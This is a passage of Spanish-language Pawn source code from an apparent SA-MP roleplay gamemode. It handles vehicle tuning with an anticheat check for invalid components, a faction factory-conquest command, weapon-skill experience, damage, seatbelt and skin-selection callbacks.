	if(autos[vehicleid][cFrontBumper] > 0) 	AddVehicleComponent(vehicleid, autos[vehicleid][cFrontBumper]);
	if(autos[vehicleid][cExhaust] > 0) 		AddVehicleComponent(vehicleid, autos[vehicleid][cExhaust]);
	if(autos[vehicleid][cPaintjob] > 0) 		ChangeVehiclePaintjob(vehicleid, autos[vehicleid][cPaintjob]-1);
}

// Public - OnVehicleMod.
//==============================================================================
public OnVehicleMod(playerid, vehicleid, componentid)
{
        if((IsPlayerInRangeOfPoint(playerid, 2, 617.5303, -1.9900, 1000.651) && GetPlayerInterior(playerid) == 1) ||
        (IsPlayerInRangeOfPoint(playerid, 2, 616.7830, -74.8150, 997.772) && GetPlayerInterior(playerid) == 2) ||
        (IsPlayerInRangeOfPoint(playerid, 2, 615.2862, -124.2390, 997.697) && GetPlayerInterior(playerid) == 3))return 1;
        new Menu[1024];
        new Texto[256];
        new Name[30];
        switch(componentid)
        {
                case 1008..1010: if(AutoProhibido(playerid)) RemoveVehicleComponent(vehicleid, componentid);
        }
        if(!AutoCrash(GetVehicleModel(vehicleid), componentid)) RemoveVehicleComponent(vehicleid, componentid);
        Menu[0]='\0';
        strcat(Menu, "{FFFFFF} Has sido kickeado por intento de Car Crash.  \n", 1024);
        strcat(Menu, "{FFFFFF} Si es un error, evite tunear su auto con lo último que le puso.  \n", 1024);
        ShowPlayerDialog(playerid, 9046, DIALOG_STYLE_MSGBOX, " {FF0000}Advertencia - ZonaZero: ", Menu, "Aceptar", "Cerrar") ;
        GetPlayerName(playerid, Name, sizeof(Name));
        format(Texto, sizeof(Texto), "Servidor: %s ha sido expulsado por el anticheat. Razón: Car Crash.", Name);
        MensajeGlobal(COLOR_AMARILLO2, Texto);
        Kick(playerid);
        return 1;
}
COMMAND:conquistar(playerid, params[])
{
	new string[128], Float:apos[3];
	if(!EsIlegal(playerid))return Mensaje(playerid, COLOR_GRIS, "Usted no pertenece a una faccion ilegal.");
	for(new i=0; i<sizeof(fabricas);i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 10.0, fabricas[i][f@conq][0], fabricas[i][f@conq][1], fabricas[i][f@conq][2]))
		{
			if(fabricas[i][f@estado])return Mensaje(playerid, COLOR_GRIS, "Esta fabrica ya esta siendo conquistada.");
			if(ObtenerApoyo(playerid) < 4)return Mensaje(playerid, COLOR_GRIS, "Para conquistar esta fabrica deben ser 4 miembros.");
			if(cuenta[playerid][cMiembro] == fabricas[i][f@Facc])return Mensaje(playerid, COLOR_GRIS, "Esta fabrica ya les pertenece.");
			if(fabricas[i][f@tiempo] > gettime())
			{
				format(string, sizeof(string), "Esta fabrica aun no puede ser conquistada faltan %s.", generarTiempo(fabricas[i][f@tiempo]-gettime()));
				Mensaje(playerid, COLOR_GRIS, string);
				return 1;
			}
			
			fabricas[i][f@estado] = true;
			MensajeRango(50.0, cuenta[playerid][cMiembro], COLOR_BLANCO, "La conquista ha comenzado, no alejarse.");
			
			SetTimerEx("conquistaHecha", 5 * 60000, false, "dd", playerid, i);
			GetPlayerPos(playerid, apos[0], apos[1], apos[2]);
			for(new p=0, _max=GetMaxPlayers();p<_max;p++)
			{
				if(IsPlayerInRangeOfPoint(p, 80.0, apos[0], apos[1], apos[2]))
				{
					if(cuenta[p][cMiembro] == cuenta[playerid][cMiembro])
					{
						temporizador(p, 5 * 60);
					}
				}
			}
			return 1;
		}
	}
	Mensaje(playerid, COLOR_ROJO, "Usted no esta cerca de una fabrica.");
	return 1;
}

CallBack::conquistaHecha(playerid, fabricaid)
{
	if(IsPlayerInRangeOfPoint(playerid, 50.0, fabricas[fabricaid][f@conq][0], fabricas[fabricaid][f@conq][1], fabricas[fabricaid][f@conq][2]))
	{
		if(ObtenerApoyo(playerid) < 3)return MensajeRango(50.0, cuenta[playerid][cMiembro], COLOR_VERDE, "No han podido conquistar la fabrica, falta de miembros.");
		
		fabricas[fabricaid][f@tiempo] = (208800) + gettime();
		fabricas[fabricaid][f@Facc] = cuenta[playerid][cMiembro];		
		MensajeRango(50.0, cuenta[playerid][cMiembro], COLOR_VERDE, "Han conquistado esta fabrica.");
		
		new string[128];
		format(string, sizeof(string), "Use{868FD9} /conquistar\n{ffffff}Propietario: {ff0000}%s", IFacciones[cuenta[playerid][cMiembro]-16][If@nombre]);
		UpdateDynamic3DTextLabelText(fabricas[fabricaid][f@label], -1, string);
	}else MensajeRango(50.0, cuenta[playerid][cMiembro], COLOR_GRIS, "No han podido conquistar la fabrica, no estan cerca.");
	fabricas[fabricaid][f@estado] = false;
	return 1;
}

public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ)
{
	new Float:pos[3], tmp15[24], tmp16[32], tmp[64];
	verificarArmaHack(playerid);
	GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
	//
	if(hittype >= 5 || hittype <= -1 || !(weaponid >= 0 && weaponid <= 46))
	{
		format(tmp16, sizeof(tmp16), "0xH%dW%d", hittype, weaponid);
		format(tmp15, sizeof(tmp15), "[NPC]%s", nonplayers[random(sizeof(nonplayers))][npcNombre]);
		ban(playerid, "EFP #1", tmp15, tmp16);
		return 0;
	}
	else if(fX >= 5000.0 || fX <= -5000.0 || fY >= 5000.0 || fY <= -5000.0 || fZ >= 5000.0 || fZ <= -5000.0)
	{
		format(tmp15, sizeof(tmp15), "[NPC]%s", nonplayers[random(sizeof(nonplayers))][npcNombre]);
		ban(playerid, "EFP #2", tmp15, "Ninguno");
		return 0;
	}
	else if(pos[0] < -6000.0 || pos[0] > 6000.0 || pos[1] < -6000.0 || pos[1] > 6000.0 || pos[2] < -6000.0 || pos[2] > 6000.0)
	{
		format(tmp15, sizeof(tmp15), "[NPC]%s", nonplayers[random(sizeof(nonplayers))][npcNombre]);
		ban(playerid, "EFP #3", tmp15, "Ninguno");
	    return 0;
	}
	
	new x = enteroChar[gAnden]{playerid};
	if(hittype == BULLET_HIT_TYPE_PLAYER_OBJECT)
	{
		if(x != 255 && hitid == habilidadArmas[x][hA@objetoid] && weaponid == habilidadArmas[x][hA@armaid])
		{
			switch(weaponid)
			{
				case 24:
				{
					cuenta[playerid][cDesert] = (cuenta[playerid][cDesert] < 999) ? (cuenta[playerid][cDesert] + habilidadArmas[x][hA@exp]):(999);
					SetPlayerSkillLevel(playerid, WEAPONSKILL_DESERT_EAGLE, cuenta[playerid][cDesert]);
					format(tmp, sizeof(tmp), "Ganas ~g~+%d~w~ EXP para la Desert Eagle, total ~g~%d/999", habilidadArmas[x][hA@exp], cuenta[playerid][cDesert]);
					TextoInformatico(5, playerid, tmp);
				}
				case 25:
				{
					cuenta[playerid][cEscopeta] = (cuenta[playerid][cEscopeta] < 999) ? (cuenta[playerid][cEscopeta] + habilidadArmas[x][hA@exp]):(999);
					SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, cuenta[playerid][cEscopeta]);
					format(tmp, sizeof(tmp), "Ganas ~g~+%d~w~ EXP para la Escopeta, total ~g~%d/999", habilidadArmas[x][hA@exp], cuenta[playerid][cEscopeta]);
					TextoInformatico(5, playerid, tmp);
				}
				case 29:
				{
					cuenta[playerid][cMP5] = (cuenta[playerid][cMP5] < 999) ? (cuenta[playerid][cMP5] + habilidadArmas[x][hA@exp]):(999);
					SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, cuenta[playerid][cMP5]);
					format(tmp, sizeof(tmp), "Ganas ~g~+%d~w~ EXP para la MP5, total ~g~%d/999", habilidadArmas[x][hA@exp], cuenta[playerid][cMP5]);
					TextoInformatico(5, playerid, tmp);
				}
				case 30:
				{
					cuenta[playerid][cAK47] = (cuenta[playerid][cAK47] < 999) ? (cuenta[playerid][cAK47] + habilidadArmas[x][hA@exp]):(999);
					SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, cuenta[playerid][cAK47]);
					format(tmp, sizeof(tmp), "Ganas ~g~+%d~w~ EXP para la Ak-47, total ~g~%d/999", habilidadArmas[x][hA@exp], cuenta[playerid][cAK47]);
					TextoInformatico(5, playerid, tmp);
				}
				case 31:
				{
					cuenta[playerid][cM4] = (cuenta[playerid][cM4] < 999) ? (cuenta[playerid][cM4] + habilidadArmas[x][hA@exp]):(999);
					SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, cuenta[playerid][cM4]);
					format(tmp, sizeof(tmp), "Ganas ~g~+%d~w~ EXP para la M4, total ~g~%d/999", habilidadArmas[x][hA@exp], cuenta[playerid][cM4]);
					TextoInformatico(5, playerid, tmp);
				}
				case 34:
				{
					cuenta[playerid][cSniper] = (cuenta[playerid][cSniper] < 999) ? (cuenta[playerid][cSniper] + habilidadArmas[x][hA@exp]):(999);
					SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, cuenta[playerid][cSniper]);
					format(tmp, sizeof(tmp), "Ganas ~g~+%d~w~ EXP para el Sniper, total ~g~%d/999", habilidadArmas[x][hA@exp], cuenta[playerid][cSniper]);
					TextoInformatico(5, playerid, tmp);
				}
			}
			return 1;
		}
	}
	return 1;
}


stock AutoCrash(modelid, componentid)
{
        if(componentid == 1025 || componentid == 1073 || componentid == 1074 || componentid == 1075 || componentid == 1076 ||
        componentid == 1077 || componentid == 1078 || componentid == 1079 || componentid == 1080 || componentid == 1081 ||
        componentid == 1082 || componentid == 1083 || componentid == 1084 || componentid == 1085 || componentid == 1096 ||
        componentid == 1097 || componentid == 1098 || componentid == 1087 || componentid == 1086)
        return true;
        switch (modelid)
        {
                case 400: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 401: return (componentid == 1005 || componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 114 || componentid == 1020 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003 || componentid == 1017 || componentid == 1007);
                case 402: return (componentid == 1009 || componentid == 1009 || componentid == 1010);
                case 404: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007);
                case 405: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1014 || componentid == 1023 || componentid == 1000);
                case 409: return (componentid == 1009);
                case 410: return (componentid == 1019 || componentid == 1021 || componentid == 1020 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
                case 411: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 412: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 415: return (componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
                case 418: return (componentid == 1020 || componentid == 1021 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1016);
                case 419: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 420: return (componentid == 1005 || componentid == 1004 || componentid == 1021 || componentid == 1019 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1003);
                case 421: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1023 || componentid == 1016 || componentid == 1000);
                case 422: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1017 || componentid == 1007);
                case 426: return (componentid == 1005 || componentid == 1004 || componentid == 1021 || componentid == 1019 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003);
                case 429: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 436: return (componentid == 1020 || componentid == 1021 || componentid == 1022 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003 || componentid == 1017 || componentid == 1007);
                case 438: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 439: return (componentid == 1003 || componentid == 1023 || componentid == 1001 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1017 || componentid == 1007 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1013);
                case 442: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 445: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 451: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 458: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 466: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 467: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 474: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 475: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 477: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1017 || componentid == 1007);
                case 478: return (componentid == 1005 || componentid == 1004 || componentid == 1012 || componentid == 1020 || componentid == 1021 || componentid == 1022 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 479: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 480: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 489: return (componentid == 1005 || componentid == 1004 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1016 || componentid == 1000);
                case 491: return (componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
                case 492: return (componentid == 1005 || componentid == 1004 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1016 || componentid == 1000);
                case 496: return (componentid == 1006 || componentid == 1017 || componentid == 1007 || componentid == 1011 || componentid == 1019 || componentid == 1023 || componentid == 1001 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1003 || componentid == 1002 || componentid == 1142 || componentid == 1143 || componentid == 1020);
                case 500: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 506: return (componentid == 1009);
                case 507: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 516: return (componentid == 1004 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1015 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007);
                case 517: return (componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1023 || componentid == 1016 || componentid == 1003 || componentid == 1017 || componentid == 1007);
                case 518: return (componentid == 1005 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
                case 526: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 527: return (componentid == 1021 || componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1014 || componentid == 1015 || componentid == 1017 || componentid == 1007);
                case 529: return (componentid == 1012 || componentid == 1011 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
                case 533: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 534: return (componentid == 1126 || componentid == 1127 || componentid == 1179 || componentid == 1185 || componentid == 1100 || componentid == 1123 || componentid == 1125 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1180 || componentid == 1178 || componentid == 1101 || componentid == 1122 || componentid == 1124 || componentid == 1106);
                case 535: return (componentid == 1109 || componentid == 1110 || componentid == 1113 || componentid == 1114 || componentid == 1115 || componentid == 1116 || componentid == 1117 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1120 || componentid == 1118 || componentid == 1121 || componentid == 1119);
                case 536: return (componentid == 1104 || componentid == 1105 || componentid == 1182 || componentid == 1181 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1184 || componentid == 1183 || componentid == 1128 || componentid == 1103 || componentid == 1107 || componentid == 1108);
                case 540: return (componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
                case 541: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 542: return (componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1015);
                case 545: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 546: return (componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
                case 547: return (componentid == 1142 || componentid == 1143 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1016 || componentid == 1003 || componentid == 1000);
                case 549: return (componentid == 1012 || componentid == 1011 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
                case 550: return (componentid == 1005 || componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003);
                case 551: return (componentid == 1005 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1023 || componentid == 1016 || componentid == 1003);
                case 555: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 558: return (componentid == 1092 || componentid == 1089 || componentid == 1166 || componentid == 1165 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1168 || componentid == 1167 || componentid == 1088 || componentid == 1091 || componentid == 1164 || componentid == 1163 || componentid == 1094 || componentid == 1090 || componentid == 1095 || componentid == 1093);
                case 559: return (componentid == 1065 || componentid == 1066 || componentid == 1160 || componentid == 1173 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1159 || componentid == 1161 || componentid == 1162 || componentid == 1158 || componentid == 1067 || componentid == 1068 || componentid == 1071 || componentid == 1069 || componentid == 1072 || componentid == 1070 || componentid == 1009);
                case 560: return (componentid == 1028 || componentid == 1029 || componentid == 1169 || componentid == 1170 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1141 || componentid == 1140 || componentid == 1032 || componentid == 1033 || componentid == 1138 || componentid == 1139 || componentid == 1027 || componentid == 1026 || componentid == 1030 || componentid == 1031);
                case 561: return (componentid == 1064 || componentid == 1059 || componentid == 1155 || componentid == 1157 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1154 || componentid == 1156 || componentid == 1055 || componentid == 1061 || componentid == 1058 || componentid == 1060 || componentid == 1062 || componentid == 1056 || componentid == 1063 || componentid == 1057);
                case 562: return (componentid == 1034 || componentid == 1037 || componentid == 1171 || componentid == 1172 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1149 || componentid == 1148 || componentid == 1038 || componentid == 1035 || componentid == 1147 || componentid == 1146 || componentid == 1040 || componentid == 1036 || componentid == 1041 || componentid == 1039);
                case 565: return (componentid == 1046 || componentid == 1045 || componentid == 1153 || componentid == 1152 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1150 || componentid == 1151 || componentid == 1054 || componentid == 1053 || componentid == 1049 || componentid == 1050 || componentid == 1051 || componentid == 1047 || componentid == 1052 || componentid == 1048);
                case 566: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 567: return (componentid == 1129 || componentid == 1132 || componentid == 1189 || componentid == 1188 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1187 || componentid == 1186 || componentid == 1130 || componentid == 1131 || componentid == 1102 || componentid == 1133);
                case 575: return (componentid == 1044 || componentid == 1043 || componentid == 1174 || componentid == 1175 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1176 || componentid == 1177 || componentid == 1099 || componentid == 1042);
                case 576: return (componentid == 1136 || componentid == 1135 || componentid == 1191 || componentid == 1190 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1192 || componentid == 1193 || componentid == 1137 || componentid == 1134);
                case 579: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 580: return (componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
                case 585: return (componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
                case 587: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 589: return (componentid == 1005 || componentid == 1004 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1024 || componentid == 1013 || componentid == 1006 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007);
                case 600: return (componentid == 1005 || componentid == 1004 || componentid == 1020 || componentid == 1022 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1017 || componentid == 1007);
                case 602: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
                case 603: return (componentid == 1144 || componentid == 1145 || componentid == 1142 || componentid == 1143 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
        }
        return 0;
}

public OnPlayerTakeDamage(playerid, issuerid, Float:amount, weaponid, bodypart)
{
	new Float:iChaleco;
	GetPlayerArmour(playerid, iChaleco);
	if(iChaleco < 1) cuenta[playerid][cVida] -= amount;
	else cuenta[playerid][cArmadura] -= amount;

	if(issuerid != INVALID_PLAYER_ID)
 	{
		new Float:SacarVida;
        GetPlayerHealth(playerid, SacarVida);
		if(bodypart == 9 && weaponid == 34)
		{
        	SetPlayerHealth(playerid, SacarVida-60);
 		}
	}
	return 1;
}
public OnVehicleDamageStatusUpdate(vehicleid, playerid)
{
	if(!booleano[gCinturon]{playerid})
	{
	    new Float:X, Float:Y, Float:Z, Float:Speed, Float:Vida;
 		GetPlayerHealth(playerid, Vida);
		GetVehicleVelocity(vehicleid, X, Y, Z);
		Speed = floatmul(floatsqroot(floatadd(floatadd(floatpower(X, 2), floatpower(Y, 2)), floatpower(Z, 2))), 200.0);
		if(Speed > 10 && Speed < 20)        SetHP(playerid, Vida-2);
		else if(Speed > 21 && Speed < 50)	SetHP(playerid, Vida-5);
		else if(Speed > 51 && Speed < 100)	SetHP(playerid, Vida-9);
		else if(Speed > 101 && Speed < 200)	SetHP(playerid, Vida-12);
		else if(Speed > 201 && Speed < 280)	SetHP(playerid, Vida-15);
	}
	return 0;
}
public OnPlayerEditAttachedObject(playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ)
{
	juguetes[playerid][index][ptScaleX] = (fScaleX < 1.5) ? (fScaleX):(1.0);
	juguetes[playerid][index][ptScaleY] = (fScaleY < 1.5) ? (fScaleY):(1.0);
	juguetes[playerid][index][ptScaleZ] = (fScaleZ < 1.5) ? (fScaleZ):(1.0);

	juguetes[playerid][index][ptPosX] = fOffsetX;
	juguetes[playerid][index][ptPosY] = fOffsetY;
	juguetes[playerid][index][ptPosZ] = fOffsetZ;
	juguetes[playerid][index][ptRotX] = fRotX;
	juguetes[playerid][index][ptRotY] = fRotY;
	juguetes[playerid][index][ptRotZ] = fRotZ;
	SetPlayerAttachedObject(playerid, index, modelid, boneid, juguetes[playerid][index][ptPosX], juguetes[playerid][index][ptPosY], juguetes[playerid][index][ptPosZ], juguetes[playerid][index][ptRotX], juguetes[playerid][index][ptRotY], juguetes[playerid][index][ptRotZ], juguetes[playerid][index][ptScaleX], juguetes[playerid][index][ptScaleY], juguetes[playerid][index][ptScaleZ]);

	new stringg[512];
	format(stringg, sizeof(stringg), "%sParte (%s)\n", stringg, HoldingBones[juguetes[playerid][slotselection[playerid]][ptBone]]);
	format(stringg, sizeof(stringg), "%sOffset X (%f)\n", stringg, (juguetes[playerid][slotselection[playerid]][ptPosX]*100));
	format(stringg, sizeof(stringg), "%sOffset Y (%f)\n", stringg, (juguetes[playerid][slotselection[playerid]][ptPosY]*100));
	format(stringg, sizeof(stringg), "%sOffset Z (%f)\n", stringg, (juguetes[playerid][slotselection[playerid]][ptPosZ]*100));
	format(stringg, sizeof(stringg), "%sRotacion X (%f)\n", stringg, juguetes[playerid][slotselection[playerid]][ptRotX]);
	format(stringg, sizeof(stringg), "%sRotacion Y (%f)\n", stringg, juguetes[playerid][slotselection[playerid]][ptRotY]);
	format(stringg, sizeof(stringg), "%sRotacion Z (%f)\n" , stringg, juguetes[playerid][slotselection[playerid]][ptRotZ]);
	format(stringg, sizeof(stringg), "%s{41FF2F}Editor Personalizado", stringg);
	ShowPlayerDialog(playerid, EDITTOYS2, DIALOG_STYLE_LIST, "Objeto Menu: Editar", stringg, "Seleccionar", "Cancelar");
}
// de ropa binco
public OnPlayerModelSelection(playerid, response, listid, modelid)
{
	if(listid == skinb)
	{
		if(response)
		{
			if(verificarDinero(playerid, 200))
			{
				cuenta[playerid][cTraje] = modelid;
				SetPlayerSkin(playerid, cuenta[playerid][cTraje]);
				MoneyGiveToPlayer(playerid, -200);
				MostrarDialogo(playerid, "{FFFFFF} Usted acabó de elegir su Skin.");
			}
		}else return Mensaje(playerid, COLOR_ROJO, "Cancelado la seleccion de skin");
	}
	
	if(listid == armariolist){
		if(response){
			SetPlayerSkin(playerid, modelid);
		}else return Mensaje(playerid, COLOR_ROJO, "Cancelado la seleccion de Skin");
	}
	return 1;
}
public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
	//Sistema de visualizacion
	new string[144], sv = enteroChar[visual]{playerid};

	if(clickedid == Text:INVALID_TEXT_DRAW)
	{
		if(booleano[_ComprandoCoche]{playerid})
		{
			SelectTextDraw(playerid, COLOR_LIMA);
		}
		else if(booleano[_ComprandoDNI]{playerid})
		{
			SelectTextDraw(playerid, COLOR_LIMA);
		}
		else if(booleano[_EstadoIphone]{playerid})
		{
			SelectTextDraw(playerid, COLOR_LIMA);
		}
		else if(enteroChar[cajeroslot]{playerid} != 255)
		{
			SelectTextDraw(playerid, COLOR_ROJO);
		}
		else if(sv != 255)
		{
			SelectTextDraw(playerid, COLOR_ROJO);
		}
		else if(booleano[npcUse]{playerid})
		{
			for(new i=0;i<sizeof(nonplayers);i++)
			{
				if(IsPlayerInRangeOfPoint(playerid, 2.0, nonplayers[i][npcPos][0], nonplayers[i][npcPos][1], nonplayers[i][npcPos][2]))
				{
					SelectTextDraw(playerid, COLOR_ROJO);
				}
			}
		}
		else if(!cuenta[playerid][cTutorial])
		{
			SelectTextDraw(playerid, COLOR_ROJO);
		}
	}
	//Sistema de NPC
	if(booleano[npcUse]{playerid})
	{
		new iAtc = entero[playerid][eActId];
		if(clickedid == nonplayers[iAtc][interfaz][5])
		{
			switch(iAtc)
			{
				case 20:
				{
					format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: Hasta luego culo sucio!", nonplayers[iAtc][npcNombre]);
					Mensaje(playerid, COLOR_BLANCO, string);
				}
				case 31:
				{
					format(string, sizeof(string), "{008000}[NPC]{ffffff} %s dice: Viva Iósif Stalin! Viva la fuerza roja comunista!!", nonplayers[iAtc][npcNombre]);
					Mensaje(playerid, COLOR_BLANCO, string);
				}
				default:
				{
